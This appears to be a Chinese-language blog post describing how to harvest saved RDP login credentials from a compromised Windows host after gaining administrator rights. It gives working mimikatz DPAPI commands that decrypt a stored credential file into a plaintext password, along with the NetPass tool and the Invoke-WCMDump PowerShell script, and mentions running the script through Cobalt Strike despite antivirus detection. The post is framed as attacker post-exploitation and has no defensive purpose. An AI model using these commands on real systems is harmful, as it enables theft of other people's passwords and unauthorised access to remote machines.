**目录**

[mimikatz抓取](#t0 "mimikatz抓取")

[NetPass抓取](#t1 "NetPass抓取")

[PowerShelll脚本抓取](#t2 "PowerShelll脚本抓取")

* * *

当我们拿到了机器的管理员权限后，想获取其[RDP](https://so.csdn.net/so/search?q=RDP&spm=1001.2101.3001.7020)登录历史保存的凭据。那么，该如何操作呢？

### mimikatz抓取

首先，执行以下命令查看目标机器是否存在RDP凭据

```
#查看mstsc的连接纪录      
cmdkey /list        
#查找本地的Credentials：      
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```


 ![](https://img-blog.csdnimg.cn/20200701230856283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

存在的话，上传mimikatz，执行以下命令，记录 guidMasterKey 值

```
mimikatz.exe "privilege::debug" "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\19DC8328D3873E6AB8EF6B081B771D2E"
```


![](https://img-blog.csdnimg.cn/20200701230856461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行以下值，找到 guidMasterKey 值 对应的 MasterKey。上面的guidMasterKey在这里是GUID

```
mimikatz.exe "privilege::debug" "sekurlsa::dpapi"
```


![](https://img-blog.csdnimg.cn/20200701231144196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行以下命令，使用上面记录的MasterKey破解指定的凭据：19DC8328D3873E6AB8EF6B081B771D2E 

```
mimikatz.exe "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\19DC8328D3873E6AB8EF6B081B771D2E /masterkey:cf8ba397fe285a877997100a3b3fe3259821fe4cb7a47bd9dc8887296a4ff7914a2a3b04a5b8a96d4ce418937604e0a23799f990abb537a599130fce394eb114"
```


![](https://img-blog.csdnimg.cn/20200701231253819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如图，破解出密码明文。

![](https://img-blog.csdnimg.cn/20200701231321918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### NetPass抓取

如果直接远程桌面登上去的话，可以使用 netpass.exe 工具直接查看

![](https://img-blog.csdnimg.cn/20200710154202967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### PowerShelll脚本抓取

```
Import-Module .\Invoke-WCMDump.ps1      
Invoke-WCMDump
```


![](https://img-blog.csdnimg.cn/20201130123954575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

使用CS导入powershell脚本执行，但是会被报毒

![](https://img-blog.csdnimg.cn/20201130131054436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)